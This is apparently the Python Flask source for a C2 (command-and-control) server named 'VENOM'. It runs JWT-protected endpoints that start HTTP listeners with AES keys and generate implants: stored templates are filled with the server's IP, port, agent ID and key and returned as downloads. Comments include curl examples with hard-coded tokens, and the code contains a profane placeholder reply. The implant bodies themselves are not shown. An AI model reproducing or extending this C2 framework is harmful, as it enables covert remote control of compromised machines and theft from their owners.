#!/usr/bin/env python3
import re
from flask import *
from argparse import ArgumentParser
from controllers.db import *
from http.server import HTTPServer
from controllers.listener import Listener
from controllers.jwt_utils import * 
import time
from threading import Thread
from random import choices
from string import ascii_uppercase, digits
import jwt
import os
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode
import socket as s 

''' TO DO: 
1- Implement a one time registration feature (Not yet)
2- Intergrate a good unified success/error handling in all test cases (Not yet)
3- Agent skeletons shall be saved inside the db (Done)
'''
_SECRET_ = "".join(choices(ascii_uppercase + digits, k=20))

if __name__ == "__main__":

    app = Flask(__name__)
    app.config['MONGODB_SETTINGS'] = {
        'db': 'users',
        'host': 'localhost',
        'port': 27017}

    _LISTENERS_ = dict()
    s = s.socket(s.AF_INET, s.SOCK_DGRAM) 
    s.connect(("8.8.8.8", 80))
    
    @app.route('/', methods=['GET'])
    def index():
        return render_template('login.html')

    @app.route('/login', methods=['POST'])
    def authenticate():
        
        if(login(request.json.get('email'), request.json.get('password'))): 
                payload = {
                        'iat': datetime.utcnow(),                          # Current time
                        'exp': datetime.utcnow() + timedelta(minutes=10),  # Expiration time
                        'sub': request.json.get('email')
                            }
                access_token = jwt.encode(payload, _SECRET_, algorithm='HS256') 
                response = make_response()
                response.set_cookie("accessToken",access_token.decode())
                return response
        else: 
                    return  'Wrong creds!', 401
        #except: 
         #   return 'Some Internal error occured!', 500  

     
    @app.route('/dashboard', methods=['GET'])
    @token_required(_SECRET_) 
    def dashboard(): 
        return 'Fuck you', 200 

    #curl http://localhost:1337/listeners -XPOST -d "action=create&port=8080" -H "cookie: accessToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NTE4NjQyMDksImV4cCI6MTY1MTg2NDgwOSwic3ViIjoidmVub21AdmVub20ubG9jYWwifQ.1mQeV6jtiI3hFvykC1X0IpslOBz2jJyitVnZrd91A1Y" 
    @app.route('/listeners', methods=['GET', 'POST'])
    @token_required(_SECRET_)
    def listeners():
        if(request.method == 'GET'):
            return 'List Listeners with their status', 200

        elif (request.method == 'POST'):
            if (request.json.get('action') == 'create' and request.json.get('port')):
                try:
                    id = "".join(choices(digits, k=5))
                    port = int(request.form.get('port'))
                    _LISTENERS_["listener_%s" % id] = HTTPServer(('0.0.0.0', port), Listener)
                    Key = os.urandom(16)
                    base64_bytes = b64encode(Key)
                    AESKey = base64_bytes.decode("ascii")
                    saveListener(id, port, AESKey)
                    listener = Thread(target=_LISTENERS_["listener_%s" % id].serve_forever)
                    listener.daemon = True
                    listener.start()
                    print(time.asctime(), "Start Server - %s:%s" %
                          ('0.0.0.0', str(request.form.get('port'))))

                    return 'Listener created successfully'
                except:
                    return 'Error while creating a listener!', 404

            elif (request.form.get('action') == 'delete'):
                if(request.form.get('ListenerId') and delListener(request.form.get('ListenerId'))):
                    print(_LISTENERS_)
                    id = request.form.get('ListenerId')
                    _LISTENERS_["listener_%s" % id].server_close()
                    return 'Listener deleted successfully', 200
                else:
                    return 'No Listener with specified ID found!', 404

        return 'Missing Parameters', 422

    #curl http://localhost:1337/implant -XPOST -H "cookie: accessToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NTE4NjQ5MTksImV4cCI6MTY1MTg2NTUxOSwic3ViIjoidmVub21AdmVub20ubG9jYWwifQ.JtTaS9jnmPLBciG4gkt_tviYHNcUUU-jTRAEwo4Qyjg" -H "content-type: application/json" -d '{"id":"26711","type":"linux"}'   
    @app.route('/implant', methods= ['POST'])
    @token_required(_SECRET_)
    def agents():
          
        type = request.json.get('type')
        listenerId = request.json.get('id')
        agentId = "".join(choices(digits, k=5))
        port = getListener(listenerId).get('port')
        key =  getListener(listenerId).get('key')
        implant = getImplant(type)  
        implant = implant.replace('REPLACE_IP', s.getsockname()[0]).replace('REPLACE_PORT', str(port)).replace('REPLACE_ID', agentId).replace('REPLACE_KEY', key)
        return Response(implant,  mimetype='application/octet-stream'), 200
        #except: 
            # return 'Listener with ID: %s not found!' % (listenerId), 404

    parser = ArgumentParser(description='Welcome to VENOM')
    parser.add_argument('--port', type=int, required=True,
                        default='8080', help='Port number, Default set to 8080 ')
    args = parser.parse_args()
    migrate()
    app.run(host='0.0.0.0', port=args.port, debug=True)
    # if(db.venom.find_one({'username': {'$eq': 'admin' }, 'password': {'$eq': "admin".encode('utf-8').hexdigest()} })):
    #   _REG_FLAG_ = 1
    # else:
    #   db.venom.insert({'username': {'$eq': 'admin' }, 'password': {'$eq': "admin".encode('utf-8').hexdigest()} }))
    #  _REG_FLAG_ = 0
